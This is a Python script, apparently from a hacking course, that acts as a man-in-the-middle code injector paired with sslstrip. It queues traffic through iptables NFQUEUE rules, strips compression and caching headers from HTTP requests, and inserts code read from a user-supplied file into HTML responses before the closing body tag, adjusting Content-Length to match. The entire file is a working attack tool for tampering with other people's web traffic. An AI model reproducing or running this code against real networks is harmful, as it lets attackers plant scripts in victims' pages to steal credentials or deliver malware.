#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse
import re


# same as original code injector except the iptable rules are different in order to deal with the sslstrip program

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-c","--code",dest="codeFile",help="File that contains the code to be injected into webpages")
    (options, arguments) = parser.parse_args()
    if not options.codeFile:
        parser.error("[-] Please enter a file extension to search for, use --help for more info")
    return options

def set_load(packet, load):
    print("[+] Replacing load...")
    print(load)
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport ==10000:
            print("[+] HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "",load)
            load = re.sub("If-Modified-Since:.*?\\r\\n", "",load)
            load = load.replace("HTTP/1.1","HTTP/1.0")
        elif scapy_packet[scapy.TCP].sport == 10000:
            print("[+] HTTP Response")
            load = scapy_packet[scapy.Raw].load.replace("</body>", codeInjection)
            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length)+ len(codeInjection)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()


options = get_arguments()
codefile = open(options.codeFile,"r")

if codefile.mode == "r":
    code = codefile.read()
print(code)
codeInjection = code.strip() + "</body>"

try:
    print("[+] Creating IP tables")
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Detected CTRL+C ")
    print("[+] Flushing IP tables")
    subprocess.call("iptables --flush",shell=True)
    print("[+] Quitting")

